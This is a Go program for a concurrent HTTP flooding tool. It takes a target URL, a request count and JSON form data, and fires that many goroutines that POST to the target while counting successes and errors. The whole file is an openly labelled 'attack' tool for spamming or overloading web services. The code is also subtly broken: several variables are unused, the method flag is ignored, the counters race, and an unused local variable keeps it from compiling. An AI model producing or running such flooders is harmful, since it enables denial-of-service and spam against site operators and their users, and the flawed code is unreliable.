package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"time"
)

var (
	referers     = []string{
		"https://www.google.com/?q=",
		"https://www.facebook.com/",
		"https://www.twitter.com/",
		"https://www.youtube.com/",
		"https://www.linkedin.com/",
		"https://www.instagram.com/",
		"https://www.tiktok.com/",
	}
	host         string
	param_joiner string
	reqCount     uint64
	duration     time.Duration
	stopFlag     int32
	start        = make(chan bool)
	acceptall    = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	}
	completeCount uint64
	errorCount    uint64
)

func main() {
	attackUrl := flag.String("url", "", "attackUrl spam attack")
	method := flag.String("method", "POST", "method for attack (POST/GET)")
	count := flag.Int("count", 1000, "count for attack")
	_data := flag.String("data", "", "data for attack")
	flag.Parse()

	var data url.Values

	if *attackUrl != "" {
		if *_data != "" {
			_body := getData(*method, *_data)
			data = _body
		}

		rand.Seed(time.Now().UnixNano())
		var wg sync.WaitGroup
		for i := 0; i < *count; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				startAttack(*attackUrl, *method, data)
			}()
			time.Sleep(time.Millisecond)
		}
		wg.Wait()
		fmt.Println("Done.", ": ", completeCount, "Error: ", errorCount)
	} else {
		fmt.Println("Please provide a valid URL.")
	}
}

func startAttack(attackUrl string, method string, data url.Values) {
	resp, err := http.PostForm(attackUrl, data)

	if err != nil {
		fmt.Println("Connection timed out:", attackUrl, "\nERROR:", err)
		errorCount++
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		errorCount++
		return
	}

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Request failed with status: %d\n", resp.StatusCode)
		errorCount++
	} else {
		completeCount++
	}
}

func getData(method string, data string) url.Values {
	if method == "POST" || method == "post" {
		var body = []byte(data)
		return getFormatPostData(body)
	}
	return nil
}

func getFormatPostData(body []byte) url.Values {
	m := map[string]string{}
	if err := json.Unmarshal(body, &m); err != nil {
		panic(err)
	}
	_body := url.Values{}
	for key, val := range m {
		_body.Add(key, val)
	}
	return _body
}
